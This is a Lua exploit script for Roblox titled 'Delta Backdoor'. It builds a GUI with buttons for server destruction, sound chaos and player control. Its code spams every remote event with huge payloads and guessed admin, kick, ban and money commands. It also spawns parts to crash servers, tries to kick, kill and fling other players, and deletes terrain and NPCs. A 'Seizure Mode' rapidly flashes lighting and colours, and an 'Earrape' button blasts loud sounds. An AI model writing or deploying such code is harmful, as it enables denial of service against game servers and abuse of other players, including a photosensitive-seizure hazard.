-- Delta Backdoor - Standalone Mobile Version
local ScreenGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local TopBar = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local CloseButton = Instance.new("TextButton")
local TabContainer = Instance.new("ScrollingFrame")
local ContentFrame = Instance.new("ScrollingFrame")

-- Protection
if game:GetService("CoreGui"):FindFirstChild("DeltaBackdoor") then
    game:GetService("CoreGui"):FindFirstChild("DeltaBackdoor"):Destroy()
end

ScreenGui.Name = "DeltaBackdoor"
ScreenGui.Parent = game:GetService("CoreGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
MainFrame.Size = UDim2.new(0, 350, 0, 500)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -250)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local Corner = Instance.new("UICorner", MainFrame)
Corner.CornerRadius = UDim.new(0, 10)

-- Top Bar
TopBar.Size = UDim2.new(1, 0, 0, 40)
TopBar.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
TopBar.BorderSizePixel = 0
TopBar.Parent = MainFrame

local TopCorner = Instance.new("UICorner", TopBar)
TopCorner.CornerRadius = UDim.new(0, 10)

-- Title
Title.Size = UDim2.new(1, -50, 1, 0)
Title.BackgroundTransparency = 1
Title.Text = "🔥 DELTA BACKDOOR"
Title.TextColor3 = Color3.new(1, 1, 1)
Title.TextSize = 18
Title.Font = Enum.Font.GothamBold
Title.Parent = TopBar

-- Close Button
CloseButton.Size = UDim2.new(0, 40, 0, 40)
CloseButton.Position = UDim2.new(1, -40, 0, 0)
CloseButton.BackgroundTransparency = 1
CloseButton.Text = "X"
CloseButton.TextColor3 = Color3.new(1, 1, 1)
CloseButton.TextSize = 20
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = TopBar

local isOpen = true
CloseButton.MouseButton1Click:Connect(function()
    isOpen = not isOpen
    MainFrame.Visible = isOpen
end)

-- Content Frame
ContentFrame.Size = UDim2.new(1, -20, 1, -60)
ContentFrame.Position = UDim2.new(0, 10, 0, 50)
ContentFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
ContentFrame.BorderSizePixel = 0
ContentFrame.ScrollBarThickness = 6
ContentFrame.Parent = MainFrame

local ContentCorner = Instance.new("UICorner", ContentFrame)
ContentCorner.CornerRadius = UDim.new(0, 8)

local Layout = Instance.new("UIListLayout", ContentFrame)
Layout.Padding = UDim.new(0, 5)
Layout.HorizontalAlignment = Enum.HorizontalAlignment.Center

-- Services
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

-- Helper Functions
local function FireAllRemotes(...)
    local args = {...}
    for _, obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            pcall(function()
                obj:FireServer(unpack(args))
            end)
        end
    end
end

local function CreateButton(text, callback)
    local Button = Instance.new("TextButton")
    Button.Size = UDim2.new(0.95, 0, 0, 40)
    Button.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    Button.Text = text
    Button.TextColor3 = Color3.new(1, 1, 1)
    Button.TextSize = 14
    Button.Font = Enum.Font.Gotham
    Button.Parent = ContentFrame
    
    local BtnCorner = Instance.new("UICorner", Button)
    BtnCorner.CornerRadius = UDim.new(0, 6)
    
    Button.MouseButton1Click:Connect(callback)
    
    ContentFrame.CanvasSize = UDim2.new(0, 0, 0, Layout.AbsoluteContentSize.Y + 10)
    return Button
end

local function CreateSection(text)
    local Section = Instance.new("TextLabel")
    Section.Size = UDim2.new(0.95, 0, 0, 30)
    Section.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    Section.Text = text
    Section.TextColor3 = Color3.fromRGB(255, 200, 50)
    Section.TextSize = 16
    Section.Font = Enum.Font.GothamBold
    Section.Parent = ContentFrame
    
    local SecCorner = Instance.new("UICorner", Section)
    SecCorner.CornerRadius = UDim.new(0, 6)
    
    ContentFrame.CanvasSize = UDim2.new(0, 0, 0, Layout.AbsoluteContentSize.Y + 10)
end

-- Build GUI
CreateSection("🔥 SERVER DESTRUCTION")

CreateButton("Mass Remote Spam", function()
    spawn(function()
        while wait() do
            FireAllRemotes(string.rep("DELTA", 1000))
            for _, obj in pairs(game:GetDescendants()) do
                if obj:IsA("RemoteFunction") then
                    pcall(function() obj:InvokeServer(string.rep("CRASH", 1000)) end)
                end
            end
        end
    end)
end)

CreateButton("Crash Server (Parts)", function()
    spawn(function()
        while wait(0.1) do
            for i = 1, 500 do
                local p = Instance.new("Part", Workspace)
                p.Size = Vector3.new(100, 100, 100)
                p.Position = Vector3.new(math.random(-5000, 5000), 1000, math.random(-5000, 5000))
                p.Anchored = false
            end
        end
    end)
end)

CreateButton("Network Flood", function()
    spawn(function()
        while wait() do
            for i = 1, 200 do
                FireAllRemotes(
                    string.rep("A", 50000),
                    string.rep("B", 50000),
                    math.huge,
                    -math.huge
                )
            end
        end
    end)
end)

CreateButton("Exploit All Remotes", function()
    local exploits = {"kick", "ban", "kill", "admin", "give", "money", 999999999, true, false}
    spawn(function()
        while wait(0.3) do
            for _, exp in pairs(exploits) do
                FireAllRemotes(exp)
            end
        end
    end)
end)

CreateSection("✨ VISUAL EFFECTS")

CreateButton("Disco Lighting", function()
    spawn(function()
        while wait(0.1) do
            Lighting.Ambient = Color3.new(math.random(), math.random(), math.random())
            Lighting.OutdoorAmbient = Color3.new(math.random(), math.random(), math.random())
            Lighting.ColorShift_Top = Color3.new(math.random(), math.random(), math.random())
        end
    end)
end)

CreateButton("Particle Hell", function()
    for _, part in pairs(Workspace:GetDescendants()) do
        if part:IsA("BasePart") then
            pcall(function()
                local p = Instance.new("ParticleEmitter", part)
                p.Rate = 1000
                p.Lifetime = NumberRange.new(10)
                p.Speed = NumberRange.new(100)
                p.Color = ColorSequence.new(Color3.new(math.random(), math.random(), math.random()))
            end)
        end
    end
end)

CreateButton("Seizure Mode", function()
    spawn(function()
        while wait() do
            Lighting.Brightness = math.random(0, 10)
            for _, v in pairs(Workspace:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Color = Color3.new(math.random(), math.random(), math.random())
                end
            end
        end
    end)
end)

CreateButton("Fog Storm", function()
    spawn(function()
        while wait(0.2) do
            Lighting.FogEnd = math.random(10, 50)
            Lighting.FogColor = Color3.new(math.random(), math.random(), math.random())
        end
    end)
end)

CreateSection("🔊 SOUND CHAOS")

CreateButton("Earrape Spam", function()
    for i = 1, 50 do
        local s = Instance.new("Sound", Workspace)
        s.SoundId = "rbxassetid://"..({142376088, 1837849285, 5816432987, 566399014})[math.random(1,4)]
        s.Volume = 10
        s.Looped = true
        s:Play()
    end
end)

CreateButton("Random Sound Flood", function()
    spawn(function()
        while wait(0.05) do
            local s = Instance.new("Sound", Workspace)
            s.SoundId = "rbxassetid://"..math.random(1000000, 9999999)
            s.Volume = 8
            s:Play()
            game.Debris:AddItem(s, 1)
        end
    end)
end)

CreateButton("Distort All Audio", function()
    for _, s in pairs(game:GetDescendants()) do
        if s:IsA("Sound") then
            s.PlaybackSpeed = math.random(10, 100) / 10
            s.Volume = 10
            s:Play()
        end
    end
end)

CreateSection("👥 PLAYER CONTROL")

CreateButton("Kick All (Attempt)", function()
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            FireAllRemotes("kick", p)
            FireAllRemotes(p, "kick")
            FireAllRemotes("Kick", p.Name)
        end
    end
end)

CreateButton("Kill All (Attempt)", function()
    FireAllRemotes("kill", "all")
    FireAllRemotes(0, "Health")
    for _, p in pairs(Players:GetPlayers()) do
        FireAllRemotes("damage", p, math.huge)
        FireAllRemotes(p.Character, 0)
    end
end)

CreateButton("Fling All", function()
    local fling = Vector3.new(math.random(-5000, 5000), 10000, math.random(-5000, 5000))
    FireAllRemotes("fling", fling)
    FireAllRemotes(fling)
    FireAllRemotes("Velocity", fling)
end)

CreateSection("⚙️ MISC")

CreateButton("Delete Terrain", function()
    pcall(function() Workspace.Terrain:Clear() end)
end)

CreateButton("Unanchor All", function()
    for _, p in pairs(Workspace:GetDescendants()) do
        if p:IsA("BasePart") then p.Anchored = false end
    end
end)

CreateButton("Delete NPCs", function()
    for _, v in pairs(Workspace:GetDescendants()) do
        if v:IsA("Model") and v:FindFirstChild("Humanoid") and not Players:GetPlayerFromCharacter(v) then
            v:Destroy()
        end
    end
end)

CreateButton("Stop All Sounds", function()
    for _, s in pairs(game:GetDescendants()) do
        if s:IsA("Sound") then s:Stop() end
    end
end)

CreateButton("Close GUI", function()
    ScreenGui:Destroy()
end)

print("✅ Delta Backdoor loaded - Tap and drag to move GUI")
